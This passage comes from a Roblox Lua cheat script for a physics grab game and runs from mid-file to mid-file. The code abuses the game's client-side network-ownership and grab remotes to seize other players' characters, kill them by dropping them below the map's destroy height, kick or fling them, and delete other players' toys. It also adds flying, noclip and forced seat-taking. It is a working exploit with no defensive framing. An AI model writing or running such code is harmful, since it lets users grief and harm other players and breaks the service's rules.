    char:WaitForChild("Humanoid")
    char:WaitForChild("HumanoidRootPart")
    task.wait(0.2)
    if AutoAttackT then
        AutoAttackF()
    end
end)


function flyF()
    if not flyT then return end
    
    local Players = game:GetService("Players")
    local UserInputService = game:GetService("UserInputService")
    local RunService = game:GetService("RunService")

    local plr = Players.LocalPlayer
    local char = plr.Character or plr.CharacterAdded:Wait()
    local humanoid = char:FindFirstChildOfClass("Humanoid") or char:WaitForChild("Humanoid")
    local hrp = char:FindFirstChild("HumanoidRootPart") or char:WaitForChild("HumanoidRootPart")

    local BV = Instance.new("BodyVelocity")
    local BG = Instance.new("BodyGyro")

    BG.P = 9e4
    BG.Parent = hrp
    BV.Parent = hrp
    BG.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
    BG.CFrame = hrp.CFrame
    BV.Velocity = Vector3.new(0,0,0)
    BV.MaxForce = Vector3.new(9e9, 9e9, 9e9)

    local CONTROL = {F=0,B=0,L=0,R=0}
    local lCONTROL = {F=0,B=0,L=0,R=0}
    local SPEED = flyV

    if flyKeyDown then flyKeyDown:Disconnect() end
    if flyKeyUp then flyKeyUp:Disconnect() end
    if flyConnection then flyConnection:Disconnect() end

    flyKeyDown = UserInputService.InputBegan:Connect(function(input, processed)
        if processed then return end
        if input.KeyCode == Enum.KeyCode.W then
            CONTROL.F = 1
        elseif input.KeyCode == Enum.KeyCode.S then
            CONTROL.B = -1
        elseif input.KeyCode == Enum.KeyCode.A then
            CONTROL.L = -1
        elseif input.KeyCode == Enum.KeyCode.D then
            CONTROL.R = 1
        end
    end)

    flyKeyUp = UserInputService.InputEnded:Connect(function(input, processed)
        if input.KeyCode == Enum.KeyCode.W then
            CONTROL.F = 0
        elseif input.KeyCode == Enum.KeyCode.S then
            CONTROL.B = 0
        elseif input.KeyCode == Enum.KeyCode.A then
            CONTROL.L = 0
        elseif input.KeyCode == Enum.KeyCode.D then
            CONTROL.R = 0
        end
    end)

    flyConnection = RunService.Heartbeat:Connect(function()
        if not flyT then
            flyConnection:Disconnect()
            if flyKeyDown then flyKeyDown:Disconnect() end
            if flyKeyUp then flyKeyUp:Disconnect() end
            BV:Destroy()
            BG:Destroy()
            humanoid.PlatformStand = false
            return
        end
        
        local camera = workspace.CurrentCamera
        SPEED = flyV
        
        if CONTROL.F + CONTROL.B ~= 0 or CONTROL.L + CONTROL.R ~= 0 then
            BV.Velocity = ((camera.CFrame.LookVector * (CONTROL.F + CONTROL.B)) + 
                ((camera.CFrame * CFrame.new(CONTROL.L + CONTROL.R, 0, 0).p) - camera.CFrame.p)) * SPEED
            lCONTROL = {F=CONTROL.F,B=CONTROL.B,L=CONTROL.L,R=CONTROL.R}
        else
            BV.Velocity = Vector3.new(0,0,0)
        end
        BG.CFrame = camera.CFrame
    end)
end

plr.CharacterAdded:Connect(function()
    task.wait(0.2)
    if flyT then
        flyF()
    end
end)

function AntiStruggleGrabF()
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local SetNetworkOwner = ReplicatedStorage.GrabEvents.SetNetworkOwner
    local DestroyGrabLine = ReplicatedStorage.GrabEvents.DestroyGrabLine
    local CreateGrabLine = ReplicatedStorage.GrabEvents.CreateGrabLine
    local Players = game:GetService("Players")

    if not AntiStruggleGrabT then return end

    task.spawn(function()
        while AntiStruggleGrabT do
            local grabParts = workspace:FindFirstChild("GrabParts")
            if not grabParts then
                task.wait()
                continue
            end

            local gp = grabParts:FindFirstChild("GrabPart")
            local weld = gp and gp:FindFirstChildOfClass("WeldConstraint")
            local part1 = weld and weld.Part1

            if part1 then
                local ownerPlayer = nil
                for _, pl in ipairs(Players:GetPlayers()) do
                    if pl.Character and part1:IsDescendantOf(pl.Character) then
                        ownerPlayer = pl
                        break
                    end
                end

                while AntiStruggleGrabT and workspace:FindFirstChild("GrabParts") do
                    if ownerPlayer then
                        local tgtTorso = ownerPlayer.Character:FindFirstChild("HumanoidRootPart") 
                        local tgtHum = ownerPlayer.Character:FindFirstChild("Humanoid")
                        local tgtHead = ownerPlayer.Character:FindFirstChild("Head")
                        local myTorso = plr.Character:FindFirstChild("HumanoidRootPart") 

                        if tgtTorso and myTorso and tgtHead then
                            local ownerValue = tgtHead:FindFirstChild("PartOwner")
                            if tgtTorso then --not ownerValue or ownerValue.Value ~= plr.Name then
                                SetNetworkOwner:FireServer(tgtTorso, CFrame.lookAt(myTorso.Position, tgtTorso.Position))
                            end
                        end
                    else
                        if part1.Parent then
                            local myTorso = plr.Character:FindFirstChild("HumanoidRootPart")
                            if myTorso then
                                SetNetworkOwner:FireServer(part1, CFrame.lookAt(myTorso.Position, part1.Position))
                            end
                        end
                    end
                    task.wait()
                end
            end
            task.wait()
        end
    end)
end

TpKLG = false
function KillGrabF()
    while KillGrabT and task.wait() do
        local grabParts = workspace:FindFirstChild("GrabParts")
        if not grabParts then continue end

        for _, grabPart in ipairs(grabParts:GetChildren()) do
            if not KillGrabT then break end
            if grabPart.Name ~= "GrabPart" then continue end

            local weldConstraint = grabPart:FindFirstChildOfClass("WeldConstraint")
            if not weldConstraint or not weldConstraint.Part1 then continue end

            local target = weldConstraint.Part1
            if not target or not target.Parent then continue end

            local targetPlayer = game.Players:FindFirstChild(target.Parent.Name)
            if not targetPlayer then continue end

            local targetChar = targetPlayer.Character
            if not targetChar then continue end

            local THead = targetChar:FindFirstChild("Head")
            local THRP = targetChar:FindFirstChild("HumanoidRootPart")
            local THum = targetChar:FindFirstChildOfClass("Humanoid")

            if not THead or not THRP or not THum then continue end
            if THum.Health <= 0 then continue end

            local char = plr.Character
            if not char then continue end

            local myTorso = char:FindFirstChild("HumanoidRootPart")
            if not myTorso then continue end

            if (myTorso.Position - target.Position).Magnitude > 30 then continue end

            local partOwner = THead:FindFirstChild("PartOwner")

            if WhiteListMode then
                local isWhitelisted = false
                for _, whitelistedName in ipairs(Whitelist) do
                    if whitelistedName == targetPlayer.Name then
                        isWhitelisted = true
                        break
                    end
                end
                if isWhitelisted then continue end
            end

            if not partOwner or not partOwner:IsA("StringValue") or partOwner.Value ~= plr.Name then
                pcall(function()
                    game:GetService("ReplicatedStorage").GrabEvents.SetNetworkOwner:FireServer(THRP, CFrame.lookAt(myTorso.Position, THRP.Position))
                end)
                continue
            end

            game:GetService("ReplicatedStorage").GrabEvents.SetNetworkOwner:FireServer(THRP, CFrame.lookAt(myTorso.Position, THRP.Position))
            game:GetService("ReplicatedStorage").GrabEvents.DestroyGrabLine:FireServer(THRP)

            weldConstraint.Part0 = nil

            if THum.RigType ~= Enum.HumanoidRigType.R15 and THum.SeatPart == nil then THum.RigType = Enum.HumanoidRigType.R15 end
            if THum.BreakJointsOnDeath == true and THum.SeatPart == nil then THum.BreakJointsOnDeath = false end

            local FallenY = workspace.FallenPartsDestroyHeight
            local targetY = (FallenY <= -50000 and -49999.50) or (FallenY <= -100 and -99.50) or -100
            if TpKLG then THRP.CFrame = CFrame.new(9999, targetY, 9999) end
        end
    end
end

AnhKick = false
function KickGrabF()
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local Players = game:GetService("Players")
    local RunService = game:GetService("RunService")

    if not KickGrabT then return end

    local localPlayer = Players.LocalPlayer
    if not localPlayer or not localPlayer.Character then return end

    local connection
    connection = RunService.Heartbeat:Connect(function()
        if not KickGrabT then
            connection:Disconnect()
            return
        end

        local myCharacter = localPlayer.Character
        local myTorso = myCharacter:FindFirstChild("Torso") or myCharacter:FindFirstChild("HumanoidRootPart")
        if not myTorso then return end

        local grabParts = workspace:FindFirstChild("GrabParts")
        if not grabParts then return end

        for _, grabPart in ipairs(grabParts:GetChildren()) do
            if grabPart.Name == "GrabPart" then
                local weld = grabPart:FindFirstChildOfClass("WeldConstraint")
                if not weld then continue end

                local originalPart1 = weld.Part1
                if not originalPart1 then continue end

                local ownerPlayer
                for _, player in ipairs(Players:GetPlayers()) do
                    if player ~= localPlayer and player.Character and originalPart1:IsDescendantOf(player.Character) then
                        ownerPlayer = player
                        break
                    end
                end

                if not ownerPlayer then continue end
                local tgtTorso = ownerPlayer.Character:FindFirstChild("HumanoidRootPart")
                if not tgtTorso then continue end

                weld.Part1 = tgtTorso

                if AnhKick then
                    local tgtHum = ownerPlayer.Character:FindFirstChild("Humanoid")
                    if not tgtHum then continue end

                    if not tgtHum.Sit then ReplicatedStorage.GrabEvents.SetNetworkOwner:FireServer(tgtTorso, CFrame.lookAt(myTorso.Position, tgtTorso.Position)) end
                    if tgtHum.Sit then ReplicatedStorage.GrabEvents.DestroyGrabLine:FireServer(tgtTorso) end
                    if ownerPlayer.IsHeld then ReplicatedStorage.GrabEvents.SetNetworkOwner:FireServer(tgtTorso, CFrame.lookAt(myTorso.Position, tgtTorso.Position)) end
                    if tgtHum.Sit then ReplicatedStorage.GrabEvents.DestroyGrabLine:FireServer(tgtTorso) end
                else
                    ReplicatedStorage.GrabEvents.SetNetworkOwner:FireServer(tgtTorso, CFrame.lookAt(myTorso.Position, tgtTorso.Position))
                    ReplicatedStorage.GrabEvents.DestroyGrabLine:FireServer(tgtTorso)
                end
            end
        end
    end)
end

function MasslessGrabF()
    while MasslessGrabT and task.wait() do
        local grabParts = workspace:FindFirstChild("GrabParts")
        
        if grabParts then
            local dragParts = {grabParts:FindFirstChild("DragPart"), grabParts:FindFirstChild("DragPart1")}
            
            for _, dragPart in pairs(dragParts) do
                if dragPart then
                    local alignOrientation = dragPart:FindFirstChildOfClass("AlignOrientation")
                    if alignOrientation then
                        alignOrientation.MaxAngularVelocity = math.huge
                        alignOrientation.MaxTorque = math.huge
                        alignOrientation.Responsiveness = 200
                    end
                    
                    local alignPosition = dragPart:FindFirstChildOfClass("AlignPosition")
                    if alignPosition then
                        alignPosition.MaxAxesForce = Vector3.new(math.huge, math.huge, math.huge)
                        alignPosition.MaxForce = math.huge
                        alignPosition.MaxVelocity = math.huge
                        alignPosition.Responsiveness = 200
                    end
                end
            end
        end
    end
end

function NoClipGrabF()
    local trackedTargets = {}
    local playerCheckCooldown = 0
    
    local function findAllParts(object, partsList)
        if object:IsA("BasePart") then
            partsList[object] = object.CanCollide
        end
        
        for _, child in ipairs(object:GetChildren()) do
            findAllParts(child, partsList)
        end
    end
    
    local function setPartsCollision(partsList, enable)
        for part, originalValue in pairs(partsList) do
            if part and part.Parent then
                if enable then
                    part.CanCollide = originalValue
                else
                    part.CanCollide = false
                end
            end
        end
    end
    
    while NoClipGrabT and task.wait() do
        local grabParts = workspace:FindFirstChild("GrabParts")
        
        if grabParts then
            local currentTargets = {}
            
            for _, grabPart in ipairs(grabParts:GetChildren()) do
                if grabPart.Name == "GrabPart" then
                    local weldConstraint = grabPart:FindFirstChildOfClass("WeldConstraint")
                    
                    if weldConstraint and weldConstraint.Part1 then
                        local target = weldConstraint.Part1
                        currentTargets[target] = true
                        
                        if not trackedTargets[target] then
                            local partsToDisable = {}
                            local isPlayer = false
                            
                            if target.Parent then
                                findAllParts(target.Parent, partsToDisable)
                                local humanoid = target.Parent:FindFirstChildOfClass("Humanoid")
                                if humanoid then
                                    isPlayer = true
                                end
                            else
                                if target:IsA("BasePart") then
                                    partsToDisable[target] = target.CanCollide
                                end
                            end
                            
                            setPartsCollision(partsToDisable, false)
                            
                            local connection
                            connection = weldConstraint.Destroying:Connect(function()
                                setPartsCollision(partsToDisable, true)
                                trackedTargets[target] = nil
                                if connection then
                                    connection:Disconnect()
                                end
                            end)
                            
                            trackedTargets[target] = {
                                target = target,
                                connection = connection,
                                partsToDisable = partsToDisable,
                                isPlayer = isPlayer,
                                lastPlayerCheck = os.clock()
                            }
                        else
                            trackedTargets[target].lastPlayerCheck = os.clock()
                        end
                    end
                end
            end
            
            playerCheckCooldown = playerCheckCooldown + task.wait()
            if playerCheckCooldown >= 0.01 then
                playerCheckCooldown = 0
                
                for target, data in pairs(trackedTargets) do
                    if data.isPlayer then
                        local newParts = {}
                        findAllParts(target.Parent, newParts)
                        
                        for part, originalValue in pairs(newParts) do
                            if not data.partsToDisable[part] then
                                data.partsToDisable[part] = originalValue
                            end
                            if part.CanCollide then
                                part.CanCollide = false
                            end
                        end
                    end
                end
            end
            
            for target, data in pairs(trackedTargets) do
                if not currentTargets[target] then
                    setPartsCollision(data.partsToDisable, true)
                    
                    if data.connection then
                        data.connection:Disconnect()
                    end
                    trackedTargets[target] = nil
                end
            end
        else
            for target, data in pairs(trackedTargets) do
                setPartsCollision(data.partsToDisable, true)
                
                if data.connection then
                    data.connection:Disconnect()
                end
            end
            trackedTargets = {}
        end
    end
    
    for target, data in pairs(trackedTargets) do
        setPartsCollision(data.partsToDisable, true)
        
        if data.connection then
            data.connection:Disconnect()
        end
    end
end
function ViewToolF()
    local Tools = {
        "NinjaKunai",
        "NinjaShuriken",
        "NinjaKatana",
        "ToolCleaver",
        "ToolDiggingForkRusty",
        "ToolPencil",
        "ToolPickaxe",
        "AG",
    }

    local Cpf = { "Campfire" }
    local AG = { "AG" }

    local function addView(item, partName, multiple, onlyView1, highTransparency)
        if onlyView1 then return end

        local function createHighlight(part, index)
            if not item:FindFirstChild("Highlight_" .. index) then
                local highlight = Instance.new("Highlight")
                highlight.Name = "Highlight_" .. index
                highlight.Adornee = item
                highlight.FillColor = Color3.fromRGB(0, 255, 0)
                highlight.FillTransparency = 1

                if item.Name == "Campfire" then
                    highlight.OutlineColor = Color3.fromRGB(255, 117, 24)
                elseif item.Name == "AG" then
                    highlight.OutlineColor = Color3.fromRGB(138, 43, 226)
                else
                    highlight.OutlineColor = Color3.fromRGB(0, 255, 0)
                end

                highlight.FillTransparency = 1
                highlight.OutlineTransparency = 0
                highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                highlight.Parent = item
            end
        end

        if multiple and partName then
            local count = 0
            for _, part in ipairs(item:GetDescendants()) do
                if part:IsA("BasePart") and part.Name == partName then
                    count += 1
                    createHighlight(part, count)
                end
            end
        elseif partName then
            local part = item:FindFirstChild(partName, true)
            if part and part:IsA("BasePart") then
                createHighlight(part, partName)
            end
        end
    end

    local function checkAndHighlightItem(item)
        if item:IsA("Model") then
            if table.find(Tools, item.Name) then
                addView(item, "StickyPart")
            elseif table.find(Cpf, item.Name) then
                addView(item, "FirePlayerPart")
            elseif table.find(AG, item.Name) then
                addView(item, nil, false, false)
            end
        end
    end

    task.spawn(function()
        while ViewToolT and task.wait(0.2) do
            for _, folder in ipairs(workspace:GetChildren()) do
                if folder:IsA("Folder") and folder.Name:match("SpawnedInToys$") then
                    for _, item in ipairs(folder:GetChildren()) do
                        checkAndHighlightItem(item)
                    end
                end
            end

            if workspace:FindFirstChild("PlotItems") then
                local plotItems = workspace.PlotItems
                for i = 1, 5 do
                    local plotName = "Plot" .. i
                    local plot = plotItems:FindFirstChild(plotName)
                    if plot then
                        for _, item in ipairs(plot:GetChildren()) do
                            checkAndHighlightItem(item)
                        end
                    end
                end
            end
        end

        for _, folder in ipairs(workspace:GetChildren()) do
            if folder:IsA("Folder") and folder.Name:match("SpawnedInToys$") then
                for _, item in ipairs(folder:GetChildren()) do
                    for _, v in ipairs(item:GetChildren()) do
                        if v.Name:match("^Highlight_") then
                            v:Destroy()
                        end
                    end
                end
            end
        end

        if workspace:FindFirstChild("PlotItems") then
            local plotItems = workspace.PlotItems
            for i = 1, 5 do
                local plotName = "Plot" .. i
                local plot = plotItems:FindFirstChild(plotName)
                if plot then
                    for _, item in ipairs(plot:GetChildren()) do
                        for _, v in ipairs(item:GetChildren()) do
                            if v.Name:match("^Highlight_") then
                                v:Destroy()
                            end
                        end
                    end
                end
            end
        end
    end)
end


function ViewAuraF()
    local targetNames = { 
        "NinjaKunai", "NinjaShuriken", "NinjaKatana", 
        "ToolCleaver", "ToolDiggingForkRusty", 
        "ToolPencil", "ToolPickaxe" 
    }

    task.spawn(function()
        while ViewAuraT and task.wait(0.03) do
            local character = plr.Character
            if not character then continue end

            local hrp = character:FindFirstChild("HumanoidRootPart")
            if not hrp then continue end

            for _, folder in ipairs(workspace:GetChildren()) do
                if folder:IsA("Folder") and folder.Name:match("SpawnedInToys$") then
                    if folder.Name ~= (plr.Name .. "SpawnedInToys") then
                        for _, item in ipairs(folder:GetChildren()) do
                            if table.find(targetNames, item.Name) and item:FindFirstChild("StickyPart") then
                                local sticky = item.StickyPart

                                local basePart = item.PrimaryPart or sticky
                                local dist = (basePart.Position - hrp.Position).Magnitude

                                if dist <= 30 then -- and sticky:FindFirstChild("PartOwner").Value ~= plr.Name then
                                    pcall(function()
                                        rs.GrabEvents.SetNetworkOwner:FireServer(sticky, CFrame.lookAt(hrp.Position, sticky.Position))
                                    end)
                                end
                            end
                        end
                    end
                end
            end
        end
    end)
end

function AntiBananaAuraF()
    local targetNames = {"FoodBanana"}

    task.spawn(function()
        while AntiBananaAuraT and task.wait(0.1) do
            local character = plr.Character
            if not character then continue end
            
            local hrp = character:FindFirstChild("HumanoidRootPart")
            if not hrp then continue end

            for _, folder in ipairs(workspace:GetChildren()) do
                if folder:IsA("Folder") and folder.Name:match("SpawnedInToys") then
                    if folder.Name ~= (plr.Name .. "SpawnedInToys") then
                        for _, item in ipairs(folder:GetChildren()) do
                            if table.find(targetNames, item.Name) and item:FindFirstChild("SoundPart") then
                                local Spart = item.SoundPart

                                local basePart = item.PrimaryPart or Spart
                                local PartOwner = item:FindFirstChild("PartOwner")
                                local dist = (basePart.Position - hrp.Position).Magnitude

                                if dist <= 30 and not PartOwner then
                                    pcall(function()
                                        rs.GrabEvents.SetNetworkOwner:FireServer(Spart, lookAt(hrp.Position, Spart.Position))
                                    end)
                                end
                            end
                        end
                    end
                end
            end
        end
    end)
end

function AntiBoxF()
    local targetNames = {"Boombox"}

    task.spawn(function()
        while AntiBoxT and task.wait(0.1) do
            local character = plr.Character
            if not character then continue end

            local hrp = character:FindFirstChild("HumanoidRootPart")
            if not hrp then continue end

            for _, folder in ipairs(workspace:GetChildren()) do
                if folder:IsA("Folder") and folder.Name:match("SpawnedInToys$") then
                    if folder.Name ~= (plr.Name .. "SpawnedInToys") then
                        for _, item in ipairs(folder:GetChildren()) do
                            if table.find(targetNames, item.Name) and item:FindFirstChild("SoundPart") then
                                local Spart = item.Button

                                local basePart = item.PrimaryPart or Spart
                                local PartOwner = Spart:FindFirstChild("PartOwner")
                                local dist = (basePart.Position - hrp.Position).Magnitude

                                FallenY = workspace.FallenPartsDestroyHeight
                                targetY = (FallenY <= -50000 and -49999) or (FallenY <= -100 and -99) or -100

                                if dist <= 30 and not PartOwner then rs.GrabEvents.SetNetworkOwner:FireServer(Spart, CFrame.lookAt(hrp.Position, Spart.Position)) end
                                if PartOwner then Spart.CFrame = CFrame.new(0, targetY, 9999) end
                            end
                        end
                    end
                end
            end
        end
    end)
end
function AntiJukeboxF()
    local targetNames = {"JukeboxOrange", "JukeboxBule"}

    task.spawn(function()
        while _G.AntiJukeboxT and task.wait(0.1) do
            local character = plr.Character
            if not character then continue end

            local hrp = character:FindFirstChild("HumanoidRootPart")
            if not hrp then continue end

            for _, folder in ipairs(workspace:GetChildren()) do
                if folder:IsA("Folder") and folder.Name:match("SpawnedInToys$") then
                    if folder.Name ~= (plr.Name .. "SpawnedInToys") then
                        for _, item in ipairs(folder:GetChildren()) do
                            if table.find(targetNames, item.Name) then
                                local Spart = item:FindFirstChild("Button") or item:FindFirstChild("SoundPart") or item.PrimaryPart
                                if not Spart then continue end

                                local basePart = item.PrimaryPart or Spart
                                local PartOwner = Spart:FindFirstChild("PartOwner")
                                local dist = (basePart.Position - hrp.Position).Magnitude

                                if dist <= 30 and not PartOwner then 
                                    rs.GrabEvents.SetNetworkOwner:FireServer(Spart, CFrame.lookAt(hrp.Position, Spart.Position)) 
                                end
                                if PartOwner then 
                                    -- 고정 풀기 및 낙사 구역 밑바닥으로 처박아 강제 삭제 유도
                                    local FallenY = workspace.FallenPartsDestroyHeight
                                    local killY = (FallenY <= -50000 and -49999) or (FallenY <= -100 and -99) or -200
                                    
                                    if Spart:IsA("BasePart") then
                                        Spart.Velocity = Vector3.new(0, 0, 0)
                                        Spart.RotVelocity = Vector3.new(0, 0, 0)
                                    end
                                    Spart.CFrame = CFrame.new(0, killY, 0)
                                end
                            end
                        end
                    end
                end
            end
        end
    end)
end

function AntiPalletF()
    local targetNames = {"PalletLightBrown"}

    task.spawn(function()
        while _G.AntiPalletT and task.wait(0.1) do
            local character = plr.Character
            if not character then continue end

            local hrp = character:FindFirstChild("HumanoidRootPart")
            if not hrp then continue end

            for _, folder in ipairs(workspace:GetChildren()) do
                if folder:IsA("Folder") and folder.Name:match("SpawnedInToys$") then
                    if folder.Name ~= (plr.Name .. "SpawnedInToys") then
                        for _, item in ipairs(folder:GetChildren()) do
                            if table.find(targetNames, item.Name) then
                                local Spart = item:FindFirstChild("Button") or item.PrimaryPart
                                if not Spart then continue end

                                local basePart = item.PrimaryPart or Spart
                                local PartOwner = Spart:FindFirstChild("PartOwner")
                                local dist = (basePart.Position - hrp.Position).Magnitude

                                if dist <= 30 and not PartOwner then 
                                    rs.GrabEvents.SetNetworkOwner:FireServer(Spart, CFrame.lookAt(hrp.Position, Spart.Position)) 
                                end
                                if PartOwner then 
                                    -- 고정 풀기 및 낙사 구역 밑바닥으로 처박아 강제 삭제 유도
                                    local FallenY = workspace.FallenPartsDestroyHeight
                                    local killY = (FallenY <= -50000 and -49999) or (FallenY <= -100 and -99) or -200
                                    
                                    if Spart:IsA("BasePart") then
                                        Spart.Velocity = Vector3.new(0, 0, 0)
                                        Spart.RotVelocity = Vector3.new(0, 0, 0)
                                    end
                                    Spart.CFrame = CFrame.new(0, killY, 0)
                                end
                            end
                        end
                    end
                end
            end
        end
    end)
end

local AntiDeathConnection = nil



function AutoSitF()
    if currentConnection then
        currentConnection:Disconnect()
        currentConnection = nil
    end

    if not AutoSitT then return end

    currentConnection = RunService.Heartbeat:Connect(function()
        local char = plr.Character
        if not char or not char:FindFirstChild("Humanoid") or not char:FindFirstChild("HumanoidRootPart") then
            return
        end

        local hum = char.Humanoid
        local root = char.HumanoidRootPart

        if hum.SeatPart ~= nil and hum.Sit == true then
            return
        end

        if BLOBSIT then
            return
        end

        local allSeats = {}

        local myInv = workspace:FindFirstChild(plr.Name.."SpawnedInToys")
        if myInv then
            for _, item in pairs(myInv:GetChildren()) do
                if item.Name == "CreatureBlobman" then
                    local seat = item:FindFirstChild("VehicleSeat")
                    if seat then
                        table.insert(allSeats, {
                            seat = seat,
                            isMine = true,
                            occupant = seat.Occupant
                        })
                    end
                end
            end
        end

        for _, otherPlayer in ipairs(game.Players:GetPlayers()) do
            if otherPlayer ~= plr then
                local otherInv = workspace:FindFirstChild(otherPlayer.Name.."SpawnedInToys")
                if otherInv then
                    for _, item in pairs(otherInv:GetChildren()) do
                        if item.Name == "CreatureBlobman" then
                            local seat = item:FindFirstChild("VehicleSeat")
                            if seat and seat.Occupant == nil then
                                table.insert(allSeats, {
                                    seat = seat,
                                    isMine = false,
                                    owner = otherPlayer,
                                    occupant = nil
                                })
                            end
                        end
                    end
                end
            end
        end

        local targetSeat = nil
        local seatType = nil

        for _, seatInfo in ipairs(allSeats) do
            if seatInfo.isMine and seatInfo.occupant == nil then
                targetSeat = seatInfo.seat
                seatType = "myEmpty"
                break
            end
        end

        if not targetSeat then
            for _, seatInfo in ipairs(allSeats) do
                if seatInfo.isMine and seatInfo.occupant ~= nil then
                    targetSeat = seatInfo.seat
                    seatType = "myOccupied"
                    break
                end
            end
        end

        if not targetSeat then
            for _, seatInfo in ipairs(allSeats) do
                if not seatInfo.isMine then
                    targetSeat = seatInfo.seat
                    seatType = "otherEmpty"
                    break
                end
            end
        end

        if not targetSeat then
            if #allSeats == 0 then
                task.spawn(function()
                    rs:WaitForChild("MenuToys"):WaitForChild("SpawnToyRemoteFunction"):InvokeServer(
                        "CreatureBlobman",
                        root.CFrame * CFrame.new(0, 0, 20),
                        Vector3.new(0, 0, 0)
                    )
                end)
            end
            return
        end

        local seat = targetSeat
        local dist = (root.Position - seat.Position).Magnitude
        local _, onScreen = Camera:WorldToViewportPoint(seat.Position)
        
        if dist > 20 then
            root.CFrame = CFrame.new(seat.Position + Vector3.new(0, 3, 0))
        elseif dist > 10 or not onScreen then
            if hum.Sit then 
                hum.Sit = false 
            end
            seat:Sit(hum)
        else
            local prompt = seat:FindFirstChild("ProximityPrompt")
            if prompt then
                if hum.Sit then hum.Sit = false end
                if hum then rs.CharacterEvents.Struggle:FireServer() end
                fireproximityprompt(prompt)
            else
                seat:Sit(hum)
            end
        end
    end)
end

function AntiBananaF()
    local dropPos = CFrame.new(0, -999999999, 0)
    local dropVec = Vector3.new(0, -999999999, 0)
    local plr = game.Players.LocalPlayer

    local targetItemsDict = {
        ["CupMugWhite"] = true, ["CupMugBrown"] = true, ["FoodBanana"] = true, 
        ["FoodBread"] = true, ["FoodBroccoli"] = true, ["FoodCakePink"] = true, 
        ["FoodCoconut"] = true, ["FoodDippyEgg"] = true, ["FoodDonut"] = true, 
        ["FoodFrenchFries"] = true, ["FoodHamburger"] = true, ["FoodHotdog"] = true, 
        ["FoodMayonnaise"] = true, ["FoodMeatStick"] = true, ["FoodMushroomPoison"] = true, 
        ["FoodPizzaCheese"] = true, ["FoodPizzaPepperoni"] = true, ["FoodSodaCan"] = true, 
        ["PoopPile"] = true, ["PoopPileSparkle"] = true, ["InstrumentBrassBugle"] = true, 
        ["InstrumentBrassTrumpet"] = true, ["InstrumentDrumBongos"] = true, 
        ["InstrumentDrumSnare"] = true, ["InstrumentGuitarAcoustic"] = true, 
        ["InstrumentGuitarBanjo"] = true, ["InstrumentGuitarLyre"] = true, 
        ["InstrumentGuitarUkulele"] = true, ["InstrumentGuitarViolin"] = true, 
        ["InstrumentPianoKeyboard"] = true, ["InstrumentPianoMelodica"] = true, 
        ["InstrumentVoiceMicrophone"] = true, ["InstrumentWoodwindOcarina"] = true, 
        ["InstrumentWoodwindSaxophone"] = true, ["InstrumentBrassVuvuzela"] = true
    }

    local processedItems = {} 

    local function GetMyPlotNumber()
        local plots = workspace:FindFirstChild("Plots")
        if not plots then return nil end

        for i = 1, 5 do
            local plot = plots:FindFirstChild("Plot" .. i)
            if plot then
                local plotSign = plot:FindFirstChild("PlotSign")
                if plotSign then
                    local owners = plotSign:FindFirstChild("ThisPlotsOwners")
                    if owners then
                        local ownerVal = owners:FindFirstChildOfClass("StringValue")
                        if ownerVal and ownerVal.Value == plr.Name then
                            return i
                        end
                    end
                end
            end
        end
        return nil
    end

    local function ProcessItem(item)
        if not item or not item.Parent then return end
        if processedItems[item] then return end

        local holdPart = item:FindFirstChild("HoldPart")
        if not holdPart then return end

        local holdRemote = holdPart:FindFirstChild("HoldItemRemoteFunction")
        local dropRemote = holdPart:FindFirstChild("DropItemRemoteFunction")

        if holdRemote and dropRemote then
            processedItems[item] = true

            task.spawn(function()
                local char = plr.Character
                if not char then 
                    processedItems[item] = nil 
                    return 
                end

                local success, err = pcall(function()
                    holdRemote:InvokeServer(item, char)
                    dropRemote:InvokeServer(item, dropPos, dropVec)
                end)

                if not success or item.Parent then
                    task.wait(1)
                    if item.Parent then
                        processedItems[item] = nil
                    end
                end
            end)
        end
    end

    while AntiBananaT do
        task.wait()

        local char = plr.Character
        if not char or not char.Parent then continue end

        local myPlotNumber = GetMyPlotNumber()
        local itemsToProcess = {}

        for _, player in ipairs(game.Players:GetPlayers()) do
            if player == plr then continue end

            if WhiteListMode then
                local isWhitelisted = false
                for _, whiteName in ipairs(Whitelist) do
                    if player.Name == whiteName then
                        isWhitelisted = true
                        break
                    end
                end
                if isWhitelisted then continue end
            end

            local folder = workspace:FindFirstChild(player.Name .. "SpawnedInToys")
            if folder then
                for _, item in ipairs(folder:GetChildren()) do
                    if targetItemsDict[item.Name] then
                        table.insert(itemsToProcess, item)
                    end
                end
            end
        end

        local plotItems = workspace:FindFirstChild("PlotItems")
        if plotItems then
            for i = 1, 5 do
                if i == myPlotNumber then continue end
                local plot = plotItems:FindFirstChild("Plot" .. i)
                if plot then
                    for _, item in ipairs(plot:GetChildren()) do
                        if targetItemsDict[item.Name] then
                            table.insert(itemsToProcess, item)
                        end
                    end
                end
            end
        end

        for _, item in ipairs(itemsToProcess) do
            if not AntiBananaT then break end
            ProcessItem(item)
        end

        for item, _ in pairs(processedItems) do
            if not item.Parent then
                processedItems[item] = nil
            end
        end
    end
end

ifKickThenT = true
local anchoredCache = {}

function ifKickThenF()
    Players.PlayerAdded:Connect(function(plr)
        plr.CharacterAdded:Connect(function(char)
            local hrp = char:WaitForChild("HumanoidRootPart", 1)
            if hrp then
                anchoredCache[plr] = false
            end
        end)
    end)

    Players.PlayerRemoving:Connect(function(plr)
        if anchoredCache[plr] == true then
            local DISP = plr.DisplayName
            local NAP = plr.Name
            Rayfield:Notify({
                Title = "[ Kick ]", 
                Content = "[" .. DISP .. "] ( @" .. NAP ..  ")", 
                Duration = 7, 
                Image = 0
            })
        end
        anchoredCache[plr] = nil
    end)

    task.spawn(function()
        while ifKickThenT do
            for _, plr in ipairs(Players:GetPlayers()) do
                local char = plr.Character
                if char then
                    local hrp = char:FindFirstChild("HumanoidRootPart")
                    if hrp then
                        anchoredCache[plr] = hrp.Anchored == true
                    end
                end
            end
            task.wait()
        end
    end)
end
ifKickThenF()

local mouse = plr:GetMouse()
function tpF()
    local char = plr.Character
    if not char then return end

    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end

    local hum = char:FindFirstChild("Humanoid")
    local ragdolled = hum:FindFirstChild("Ragdolled")

    local target = mouse.Target
    if not target then return end

    local currentCFrame = hrp.CFrame
    local currentRotation = CFrame.new(Vector3.zero, currentCFrame.LookVector)

    local parts = {"Head", "Torso", "Left Leg", "Right Leg", "Left Arm", "Right Arm"}
    for _, name in ipairs(parts) do
